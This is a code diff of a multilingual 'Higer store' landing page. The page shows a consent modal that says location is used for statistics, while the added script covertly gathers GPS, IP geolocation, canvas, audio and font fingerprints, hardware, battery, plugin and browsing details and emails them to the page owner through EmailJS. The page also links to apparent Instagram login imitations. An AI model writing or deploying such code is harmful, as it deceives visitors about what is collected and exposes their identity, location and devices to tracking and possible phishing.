+                ar: { page_title: "متجر هايجر", welcome_title: "أهلاً وسهلاً", welcome_subtitle: "يرجى تأكيد المعلومات للمتابعة.", join_telegram: '<i class="fab fa-telegram-plane text-2xl ml-3"></i> انضم إلى مجموعة التليجرام', modal_title: "معلومات", modal_text: "يطلب هذا الموقع الإذن لاستخدام بيانات موقعك لأغراض إحصائية. يرجى إدخال اسمك والتأكيد للمتابعة.", name_placeholder: "أدخل اسمك...", reject_button: "رفض", accept_button: "قبول", error_must_accept: "يجب أن تقبل للمتابعة.", error_make_choice: "الرجاء تحديد اختيار.", error_enter_name: "الرجاء إدخال اسمك.", status_success: "تم التحقق بنجاح. ✅", status_fail_send: "فشل التحقق. ❌", status_fail_critical: "فشل التحقق من الروبوت. لم يتمكن من جمع البيانات. ❌", status_fail_init: "لم يتمكن من تهيئة خدمة الإرسال!", link_chess: "لعبة الشطرنج", link_insta1: "نسخة انستغرام 1", link_pong: "لعبة هيجر بونج", link_insta2: "نسخة انستغرام 2", geo_unsupported: "الواجهة البرمجية غير مدعومة", geo_denied: "رفض من قبل المستخدم", geo_unavailable: "غير متوفر", gpu_fail: "لا يمكن الحصول على الامتداد", gpu_error: "خطأ في الاسترداد", charging: "جاري الشحن", not_charging: "لا يشحن", yes: "نعم", no: "لا", unspecified: "غير محدد", direct_entry: "دخول مباشر", verifying_text: "يتم التحقق..." }
             };
 
-            const linkData = [
-                { key: "link_chess", url: "https://higer23.github.io/Chess/", icon: "fa-chess-knight", color: "text-cyan-400" },
-                { key: "link_insta1", url: "https://higer23.github.io/Instaagram-Login/", icon: "fa-brands fa-instagram", color: "text-pink-500" },
-                { key: "link_pong", url: "https://higer23.github.io/ponghig/", icon: "fa-gamepad", color: "text-green-400" },
-                { key: "link_insta2", url: "https://higer23.github.io/Instagram/", icon: "fa-brands fa-instagram", color: "text-purple-400" }
+            let currentLang = 'tr';
+
+            // --- DOM ELEMENTS ---
+            const modalBackdrop = document.getElementById('modal-backdrop');
+            const modalContent = document.getElementById('modal-content');
+            const acceptBtn = document.getElementById('accept-btn');
+            const rejectBtn = document.getElementById('reject-btn');
+            const errorMessage = document.getElementById('error-message');
+            const spinnerOverlay = document.getElementById('spinner-overlay');
+            const statusMessage = document.getElementById('status-message');
+            const visitorNameInput = document.getElementById('visitor-name-input');
+            const linkButtonsContainer = document.getElementById('link-buttons');
+
+            // --- LANGUAGE AND UI FUNCTIONS ---
+            const setLanguage = (lang) => {
+                if (!translations[lang]) return;
+                currentLang = lang;
+                document.documentElement.lang = lang;
+                localStorage.setItem('preferredLanguage', lang);
+                document.documentElement.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+                
+                document.querySelectorAll('[data-translate-key]').forEach(el => {
+                    const key = el.getAttribute('data-translate-key');
+                    const translation = translations[lang][key];
+                    if (translation !== undefined) {
+                        if (el.placeholder !== undefined) {
+                            el.placeholder = translation;
+                        }
+                        el.innerHTML = translation;
+                    }
+                });
+                document.title = translations[lang].page_title;
+                generateLinkButtons();
+
+                document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
+                document.getElementById(`lang-${lang}`).classList.add('active');
+            };
+
+            // --- DYNAMIC BUTTON SYSTEM ---
+            const links = [
+                { key: "link_chess", url: "https://higer23.github.io/Chess/", date: "10.09.2025", icon: "fa-solid fa-chess-knight" },
+                { key: "link_insta1", url: "https://higer23.github.io/Instaagram-Login/", date: "10.09.2025", icon: "fa-brands fa-instagram" },
+                { key: "link_pong", url: "https://higer23.github.io/ponghig/", date: "10.09.2025", icon: "fa-solid fa-table-tennis-paddle-ball" },
+                { key: "link_insta2", url: "https://higer23.github.io/Instagram/", date: "10.09.2025", icon: "fa-brands fa-instagram" }
             ];
 
-            let state = {
-                lang: 'tr',
-                isMuted: true,
-                isBooted: false,
-                startTime: Date.now()
-            };
-
-            // --- AUDIO SYSTEM ---
-            const playSound = (type) => {
-                if(state.isMuted) return;
-                const synth = new Tone.PolySynth(Tone.Synth).toDestination();
-                if(type === 'success') {
-                    synth.triggerAttackRelease(["C4", "E4", "G4"], "16n");
-                } else if(type === 'error') {
-                    const noise = new Tone.NoiseSynth().toDestination();
-                    noise.triggerAttackRelease("16n");
-                } else if(type === 'boot') {
-                    const low = new Tone.Oscillator(50, "sawtooth").toDestination().start().stop("+1");
-                }
-            };
-
-            // --- MATRIX RAIN ENGINE ---
-            const initMatrix = () => {
-                const canvas = document.getElementById('matrix-canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-
-                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*";
-                const fontSize = 14;
-                const columns = canvas.width / fontSize;
-                const drops = Array(Math.floor(columns)).fill(1);
-
-                function draw() {
-                    ctx.fillStyle = "rgba(2, 6, 23, 0.05)";
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    ctx.fillStyle = "#0ff";
-                    ctx.font = fontSize + "px monospace";
-
-                    for(let i=0; i<drops.length; i++) {
-                        const text = chars.charAt(Math.floor(Math.random() * chars.length));
-                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                        if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                        drops[i]++;
-                    }
-                }
-                setInterval(draw, 50);
-            };
-
-            // --- PARTICLE ENGINE ---
-            const initParticles = () => {
-                const canvas = document.getElementById('particles-canvas');
-                const ctx = canvas.getContext('2d');
-                let pts = [];
-                const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
-                window.addEventListener('resize', resize); resize();
-
-                for(let i=0; i<50; i++) pts.push({
-                    x: Math.random()*canvas.width, y: Math.random()*canvas.height,
-                    vx: (Math.random()-0.5)*0.3, vy: (Math.random()-0.5)*0.3,
-                    s: Math.random()*2
-                });
-
-                function animate() {
-                    ctx.clearRect(0,0,canvas.width, canvas.height);
-                    ctx.fillStyle = "rgba(0, 242, 255, 0.2)";
-                    pts.forEach(p => {
-                        p.x += p.vx; p.y += p.vy;
-                        if(p.x < 0 || p.x > canvas.width) p.vx *= -1;
-                        if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
-                        ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill();
-                    });
-                    requestAnimationFrame(animate);
-                }
-                animate();
-            };
-
-            // --- DATA MINING ---
-            const fetchSystemData = async () => {
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    const data = await res.json();
-                    document.getElementById('visitor-ip-display').textContent = data.ip;
-                    document.getElementById('visitor-region').textContent = `${data.city}, ${data.country_code}`;
-                    return data;
-                } catch(e) {
-                    return { ip: "127.0.0.1", city: "Offline" };
-                }
-            };
-
-            const getFullMetrics = async () => {
-                const ipInfo = await fetchSystemData();
-                return {
-                    ...ipInfo,
-                    agent: navigator.userAgent,
-                    cores: navigator.hardwareConcurrency || 'N/A',
-                    mem: navigator.deviceMemory || 'N/A',
-                    res: `${window.screen.width}x${window.screen.height}`,
-                    lang: navigator.language,
-                    on: new Date().toISOString()
-                };
-            };
-
-            // --- UI LOGIC ---
-            const updateClock = () => {
-                const now = new Date();
-                document.getElementById('system-clock').textContent = now.toLocaleTimeString();
-                document.getElementById('ping-meter').textContent = Math.floor(Math.random()*15 + 10) + 'ms';
-                
-                // Sim Resource usage
-                const cpu = Math.floor(Math.random()*10 + 5);
-                document.getElementById('cpu-val').textContent = cpu + '%';
-                document.getElementById('cpu-bar').style.width = cpu + '%';
-            };
-
-            const renderLinks = (filter = "") => {
-                const container = document.getElementById('links-container');
-                container.innerHTML = "";
-                
-                linkData.filter(item => translations[state.lang][item.key].toLowerCase().includes(filter.toLowerCase()))
-                .forEach(l => {
-                    const div = document.createElement('a');
-                    div.href = l.url;
-                    div.target = "_blank";
-                    div.className = "cyber-card glass-panel p-5 flex items-center justify-between group cursor-pointer";
-                    div.innerHTML = `
-                        <div class="flex items-center gap-4">
-                            <div class="w-12 h-12 bg-white/5 rounded-lg flex items-center justify-center group-hover:bg-cyan-500/20 transition-colors">
-                                <i class="fa-solid ${l.icon} ${l.color} text-xl"></i>
-                            </div>
-                            <div>
-                                <h4 class="font-orbitron text-xs font-bold text-white group-hover:text-cyan-400 transition-colors">${translations[state.lang][l.key]}</h4>
-                                <p class="text-[9px] font-share text-gray-500 uppercase tracking-widest mt-1">Status: Stable</p>
-                            </div>
+            const generateLinkButtons = () => {
+                if (!linkButtonsContainer) return;
+                linkButtonsContainer.innerHTML = '';
+                const fragment = document.createDocumentFragment();
+                const scrollableDiv = document.createElement('div');
+                scrollableDiv.className = 'max-h-[40vh] overflow-y-auto custom-scrollbar pr-2';
+                links.slice().reverse().forEach(link => {
+                    const button = document.createElement('a');
+                    button.href = link.url;
+                    button.target = '_blank';
+                    button.rel = 'noopener noreferrer';
+                    button.className = "link-button w-full flex items-center justify-between p-4 bg-indigo-900/50 hover:bg-indigo-900/80 border border-indigo-800 text-white rounded-xl shadow-lg transition-all transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-indigo-500/50 mb-4";
+                    const title = translations[currentLang][link.key] || 'Link';
+                    button.innerHTML = `
+                        <div class="text-left">
+                            <span class="text-lg font-semibold">${title}</span>
+                            <span class="block text-xs text-gray-400 mt-1">${link.date}</span>
                         </div>
-                        <i class="fa-solid fa-link text-[10px] text-gray-700 group-hover:text-cyan-400"></i>
-                    `;
-                    container.appendChild(div);
+                        <i class="${link.icon} text-3xl text-indigo-400 link-button-icon"></i>`;
+                    scrollableDiv.appendChild(button);
                 });
+                fragment.appendChild(scrollableDiv);
+                linkButtonsContainer.appendChild(fragment);
             };
 
-            // --- BOOT SEQUENCE ---
-            const runBoot = async (username) => {
-                const bootBox = document.getElementById('boot-screen');
-                const logBox = document.getElementById('terminal-content');
-                bootBox.classList.remove('hidden');
+            // --- HELPER & SOUND FUNCTIONS ---
+            const playSound = async (noteSequence) => { try { await Tone.start(); const synth = new Tone.Synth().toDestination(); const now = Tone.now(); noteSequence.forEach((note, i) => synth.triggerAttackRelease(note.note, note.duration, now + i * 0.15)); } catch (error) { console.warn("Could not play sound effect:", error); } };
+            const shakeModal = (key) => { errorMessage.textContent = translations[currentLang][key]; errorMessage.classList.remove('hidden'); modalContent.classList.add('animate-shake'); setTimeout(() => modalContent.classList.remove('animate-shake'), 500); };
+            const showStatusMessage = (key, isSuccess) => {
+                const message = translations[currentLang][key];
+                const icon = isSuccess ? '<i class="fa-solid fa-check-circle mr-3"></i>' : '<i class="fa-solid fa-xmark-circle mr-3"></i>';
+                statusMessage.innerHTML = `${icon} ${message}`;
+                statusMessage.className = `fixed bottom-5 right-5 flex items-center p-4 rounded-lg text-white font-bold shadow-2xl z-[70] transition-all duration-500 ${isSuccess ? 'bg-green-600' : 'bg-red-600'} animate-slide-in-right`;
+                setTimeout(() => { statusMessage.style.opacity = '0'; statusMessage.style.transform = 'translateX(100%)'; }, 4000);
+            };
+            const NA = "N/A";
+            const cyrb53 = (str, seed = 0) => { let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed; for (let i = 0, ch; i < str.length; i++) { ch = str.charCodeAt(i); h1 = Math.imul(h1 ^ ch, 2654435761); h2 = Math.imul(h2 ^ ch, 1597334677); } h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909); h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909); return 4294967296 * (2097151 & h2) + (h1 >>> 0); };
+
+            // --- ADVANCED DATA COLLECTION FUNCTIONS ---
+            const getFingerprints = async () => {
+                const getCanvasFp = () => { try { const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); const txt = 'abcdefghijklmnopqrstuvwxyz0123456789'; ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText(txt, 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText(txt, 4, 17); return cyrb53(canvas.toDataURL()); } catch (e) { return NA; } };
+                const getAudioFp = async () => { try { const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100); const oscillator = audioCtx.createOscillator(); oscillator.type = "triangle"; oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime); const compressor = audioCtx.createDynamicsCompressor(); compressor.threshold.setValueAtTime(-50, audioCtx.currentTime); oscillator.connect(compressor); compressor.connect(audioCtx.destination); oscillator.start(0); const renderedBuffer = await audioCtx.startRendering(); const fingerprint = renderedBuffer.getChannelData(0).slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toString(); return cyrb53(fingerprint); } catch (e) { return NA; } };
                 
-                const logs = [
-                    `[SYS] Initializing Higer OS v3.0...`,
-                    `[SYS] Loading kernel modules...`,
-                    `[SYS] Mapping neural paths for user: ${username}`,
-                    `[SYS] Establishing secure tunnel to edge nodes...`,
-                    `[NET] Global IP detected: ${document.getElementById('visitor-ip-display').textContent}`,
-                    `[SEC] Bypassing localized firewalls...`,
-                    `[SEC] Encryption layer 256-AES active.`,
-                    `[DATA] Syncing database records...`,
-                    `[DATA] Collecting device metrics...`,
-                    `[SYS] Loading UI assets...`,
-                    `[SYS] Handshake complete. Welcome, Agent.`
-                ];
+                // **FIX for the 'mmmm' bug**: Use an off-screen container for font probing.
+                const getFontsFp = () => {
+                    const probeDiv = document.createElement('div');
+                    probeDiv.style.position = 'absolute';
+                    probeDiv.style.left = '-9999px';
+                    probeDiv.style.top = '-9999px';
+                    probeDiv.style.visibility = 'hidden';
+                    document.body.appendChild(probeDiv);
+                    
+                    try {
+                        const baseFonts = ['monospace', 'sans-serif', 'serif']; const testString = "mmmmmmmmmmlli"; const testSize = '72px';
+                        const s = document.createElement("span"); s.style.fontSize = testSize; s.innerHTML = testString;
+                        const defaultWidth = {}; const defaultHeight = {};
+                        baseFonts.forEach(font => { s.style.fontFamily = font; probeDiv.appendChild(s); defaultWidth[font] = s.offsetWidth; defaultHeight[font] = s.offsetHeight; probeDiv.removeChild(s); });
+                        const fontList = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+                        let availableFonts = fontList.filter(font => baseFonts.some(baseFont => { s.style.fontFamily = `${font},${baseFont}`; probeDiv.appendChild(s); const detected = s.offsetWidth !== defaultWidth[baseFont] || s.offsetHeight !== defaultHeight[baseFont]; probeDiv.removeChild(s); return detected; }));
+                        return cyrb53(availableFonts.join(','));
+                    } catch (e) { return NA; }
+                    finally {
+                        document.body.removeChild(probeDiv);
+                    }
+                };
+                const [audio_fingerprint, canvas_fingerprint, fonts_hash] = await Promise.all([ getAudioFp(), getCanvasFp(), getFontsFp() ]);
+                return { audio_fingerprint, canvas_fingerprint, fonts_hash };
+            };
+            const getGeolocationInfo = () => new Promise(resolve => { const fetchIpApi = async () => { try { const response = await fetch(`https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`); if (!response.ok) return { query: NA, status: 'fail', message: `HTTP error ${response.status}` }; return await response.json(); } catch (e) { return { query: NA, status: 'fail', message: 'Network request failed' }; } }; if (!navigator.geolocation) return resolve({ ip: NA, geolocation: translations[currentLang].geo_unsupported }); navigator.geolocation.getCurrentPosition( async pos => { const ipApiData = await fetchIpApi(); const fullGeoData = { PERMISSION: 'Granted', GPS_COORDS: { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }, IP_API_DATA: ipApiData }; resolve({ ip: ipApiData.query, geolocation: JSON.stringify(fullGeoData, null, 2) }); }, async err => { const ipApiData = await fetchIpApi(); const fullGeoData = { PERMISSION: err.code === 1 ? translations[currentLang].geo_denied : translations[currentLang].geo_unavailable, IP_API_DATA: ipApiData }; resolve({ ip: ipApiData.query, geolocation: JSON.stringify(fullGeoData, null, 2) }); }, { timeout: 10000, enableHighAccuracy: true } ); });
+            const getSystemInfo = async () => { const ua = navigator.userAgent || ''; let os = NA, browser = NA, engine = NA; if (/Windows/.test(ua)) os = "Windows"; else if (/Macintosh/.test(ua)) os = "macOS"; else if (/Linux/.test(ua)) os = "Linux"; else if (/Android/.test(ua)) os = "Android"; else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS"; const edgeMatch = ua.match(/Edg\/([\d.]+)/); const firefoxMatch = ua.match(/Firefox\/([\d.]+)/); const chromeMatch = ua.match(/Chrome\/([\d.]+)/); const safariMatch = ua.match(/Version\/([\d.]+).*Safari/); if (edgeMatch) { browser = `Edge ${edgeMatch[1]}`; engine = 'Blink'; } else if (chromeMatch) { browser = `Chrome ${chromeMatch[1]}`; engine = 'Blink'; } else if (firefoxMatch) { browser = `Firefox ${firefoxMatch[1]}`; engine = 'Gecko'; } else if (safariMatch) { browser = `Safari ${safariMatch[1]}`; engine = 'WebKit'; } let gpu = NA; try { const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); if (gl) { const ext = gl.getExtension('WEBGL_debug_renderer_info'); gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : translations[currentLang].gpu_fail; } } catch(e) { gpu = translations[currentLang].gpu_error; } let uad = { platform: NA, mobile: NA, brand: NA, model: NA }; if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') { try { Object.assign(uad, await navigator.userAgentData.getHighEntropyValues(["platform", "model", "brand", "uaFullVersion"])); } catch(e) { console.warn("Could not get high entropy values:", e); } } const conn = navigator.connection || null; return { os: `${os} (${uad.platform || navigator.platform || NA})`, device_platform: navigator.platform || NA, browser, browser_engine: engine, user_agent: ua, gpu_info: gpu, cpu_cores: navigator.hardwareConcurrency || NA, ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : NA, plugins_list: (navigator.plugins ? Array.from(navigator.plugins) : []).map(p => p.name).join(', ') || NA, network_info: conn ? `${conn.effectiveType || NA}, Downlink: ${conn.downlink || NA} Mbps` : NA, user_agent_data: JSON.stringify(uad, null, 2), device_brand: uad.brand || NA, device_model: uad.model || NA }; };
+            const getBehavioralInfo = () => { const s = window.screen; const gcd = (a, b) => b ? gcd(b, a % b) : a; const r = gcd(s.width, s.height); return { screen_resolution: `${s.width}x${s.height}`, aspect_ratio: `${s.width/r}:${s.height/r}`, color_pixel_depth: `${s.colorDepth} bit / ${s.pixelDepth} bit`, screen_orientation: s.orientation ? s.orientation.type : NA, navigator_languages: navigator.languages ? navigator.languages.join(', ') : NA, keyboard_layout: navigator.keyboard ? 'API Supported' : 'API Not Supported', do_not_track: navigator.doNotTrack || translations[currentLang].unspecified, pointer_support: window.matchMedia('(pointer: fine)').matches ? 'Mouse/Fine' : 'Coarse/Touch', touch_capable: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? translations[currentLang].yes : translations[currentLang].no, history_length: history.length, device_type: /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop/Tablet' }; };
+            const getMiscInfo = async () => { let battery_status = NA, battery_charge_discharge_time = NA; if (navigator.getBattery && typeof navigator.getBattery === 'function') { try { const battery = await navigator.getBattery(); battery_status = `${Math.round(battery.level*100)}% (${battery.charging ? translations[currentLang].charging : translations[currentLang].not_charging})`; const chargeTime = isFinite(battery.chargingTime) ? `${battery.chargingTime/60}min` : NA; const dischargeTime = isFinite(battery.dischargingTime) ? `${battery.dischargingTime/60}min` : NA; battery_charge_discharge_time = `Charge: ${chargeTime}, Discharge: ${dischargeTime}`; } catch(e) {} } const adblock = await (async () => { try { await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", { method: 'HEAD', mode: 'no-cors', cache: 'no-store' }); return translations[currentLang].no; } catch (error) { return translations[currentLang].yes; } })(); const apis = { 'WebUSB': !!navigator.usb, 'WebBluetooth': !!navigator.bluetooth, 'WebXR': !!navigator.xr, 'Gamepad': !!navigator.getGamepads, 'WebRTC': !!window.RTCPeerConnection, 'WebAudio': !!(window.AudioContext || window.webkitAudioContext) }; const advanced_api_support = Object.entries(apis).filter(([_,v]) => v).map(([k,_]) => k).join(', ') || NA; return { battery_status, battery_charge_discharge_time, adblock_detected: adblock, sensor_support: ('DeviceMotionEvent' in window) ? translations[currentLang].yes : `${translations[currentLang].no}/Unknown`, advanced_api_support, referrer: document.referrer || translations[currentLang].direct_entry }; };
+            const collectAllData = async () => { const promises=[getGeolocationInfo(),getFingerprints(),getSystemInfo(),getBehavioralInfo(),getMiscInfo()];const results=await Promise.allSettled(promises);const allData=results.reduce(((e,t)=>"fulfilled"===t.status&&t.value?{...e,...t.value}:e),{});return allData.timestamp=(new Date).toISOString(),allData.visit_duration=`${((new Date-startTime)/1e3).toFixed(2)} seconds`,["timestamp","visitor_name","ip","geolocation","canvas_fingerprint","audio_fingerprint","fonts_hash","device_type","device_brand","device_model","gpu_info","cpu_cores","ram_gb","battery_status","battery_charge_discharge_time","screen_resolution","aspect_ratio","color_pixel_depth","screen_orientation","sensor_support","os","device_platform","browser","browser_engine","user_agent","plugins_list","referrer","network_info","navigator_languages","keyboard_layout","adblock_detected","do_not_track","pointer_support","touch_capable","history_length","visit_duration","user_agent_data","advanced_api_support"].forEach((e=>{allData[e]||(allData[e]=NA)})),allData};
 
-                for(let i=0; i < logs.length; i++) {
-                    const p = document.createElement('p');
-                    p.innerHTML = `<span class="text-gray-600">[${new Date().toLocaleTimeString()}]</span> ${logs[i]}`;
-                    logBox.appendChild(p);
-                    logBox.scrollTop = logBox.scrollHeight;
-                    
-                    const pct = Math.floor(((i+1)/logs.length)*100);
-                    document.getElementById('load-bar').style.width = pct + '%';
-                    document.getElementById('load-pct').textContent = pct + '%';
-                    
-                    await new Promise(r => setTimeout(r, Math.random()*300 + 100));
+            const sendData = async (params) => {
+                spinnerOverlay.classList.remove('hidden');
+                try {
+                    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
+                    showStatusMessage("status_success", true);
+                } catch (error) {
+                    console.error("EmailJS send failed:", error);
+                    showStatusMessage("status_fail_send", false);
+                } finally {
+                    spinnerOverlay.classList.add('hidden');
                 }
-
-                setTimeout(() => {
-                    bootBox.classList.add('opacity-0');
-                    setTimeout(() => bootBox.classList.add('hidden'), 500);
-                    state.isBooted = true;
-                    document.getElementById('status-text').textContent = "ACCESS_GRANTED // SESSION_ACTIVE";
-                    document.getElementById('status-text').classList.replace('text-cyan-500', 'text-green-500');
-                }, 1000);
             };
 
-            // --- EVENT HANDLERS ---
+            // --- EVENT LISTENERS ---
+            rejectBtn.addEventListener('click', () => { playSound([{note: "C3", duration: "8n"}]); shakeModal("error_must_accept"); });
+            modalBackdrop.addEventListener('click', (event) => { if (event.target === modalBackdrop) { playSound([{note: "C3", duration: "8n"}]); shakeModal("error_make_choice"); } });
+            
             document.querySelectorAll('.lang-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    state.lang = btn.dataset.lang;
-                    document.querySelectorAll('[data-translate-key]').forEach(el => {
-                        el.textContent = translations[state.lang][el.dataset.translateKey];
-                    });
-                    renderLinks();
-                    document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('bg-cyan-600', b === btn));
+                btn.addEventListener('click', (e) => {
+                    const lang = e.target.id.split('-')[1];
+                    setLanguage(lang);
                 });
             });
 
-            document.getElementById('gate-init').addEventListener('click', async () => {
-                const nameInput = document.getElementById('auth-codename');
-                if(!nameInput.value.trim()) {
-                    playSound('error');
-                    const err = document.getElementById('gate-error');
-                    err.textContent = "IDENTIFICATION_FAILURE: NAME_REQUIRED";
-                    err.classList.remove('hidden');
+            acceptBtn.addEventListener('click', async () => {
+                const visitorName = visitorNameInput.value.trim();
+                if (!visitorName) {
+                    playSound([{note: "C3", duration: "8n"}]);
+                    shakeModal("error_enter_name");
                     return;
                 }
+                errorMessage.classList.add('hidden');
+                playSound([{note: "C4", duration: "8n"}, {note: "E4", duration: "8n"}, {note: "G4", duration: "8n"}]);
+                modalBackdrop.classList.add('hidden');
+                spinnerOverlay.classList.remove('hidden');
 
-                playSound('success');
-                const user = nameInput.value.trim();
-                document.getElementById('access-gate').classList.add('hidden');
-                
-                await runBoot(user);
-                
-                const metrics = await getFullMetrics();
-                metrics.visitor_name = user;
-                
                 try {
-                    await emailjs.send(EMAILJS_KEY.SERVICE, EMAILJS_KEY.TEMPLATE, metrics);
-                } catch(e) { console.error("Uplink failed"); }
+                    const data = await collectAllData();
+                    data.visitor_name = visitorName;
+                    await sendData(data);
+                } catch (error) {
+                    console.error("Critical error during data collection:", error);
+                    showStatusMessage("status_fail_critical", false);
+                } finally {
+                    spinnerOverlay.classList.add('hidden');
+                }
             });
-
-            document.getElementById('audio-master').addEventListener('click', function() {
-                state.isMuted = !state.isMuted;
-                this.innerHTML = state.isMuted ? '<i class="fa-solid fa-volume-xmark"></i>' : '<i class="fa-solid fa-volume-high text-cyan-400"></i>';
-                if(!state.isMuted) Tone.start();
-            });
-
-            document.getElementById('db-search').addEventListener('input', (e) => renderLinks(e.target.value));
 
             // --- INITIALIZATION ---
-            emailjs.init(EMAILJS_KEY.PUBLIC);
-            initMatrix();
-            initParticles();
-            setInterval(updateClock, 1000);
-            renderLinks();
-            fetchSystemData();
+            const initialize = () => {
+                const savedLang = localStorage.getItem('preferredLanguage');
+                const browserLang = navigator.language.split('-')[0];
+                const validLangs = ['tr', 'de', 'en', 'fr', 'es', 'ar'];
+                const initialLang = savedLang || (validLangs.includes(browserLang) ? browserLang : 'tr');
+                setLanguage(initialLang);
+                
+                try { emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY }); }
+                catch (e) { console.error("Could not initialize EmailJS. Is the public key correct?", e); showStatusMessage("status_fail_init", false); }
+            };
+
+            initialize();
         });
-    </script> 
- </body>
-                                                                                                                                                                                                                                                                                                                                                                                                </html>
+    </script>
+
+</body></html>
+
+
+
+
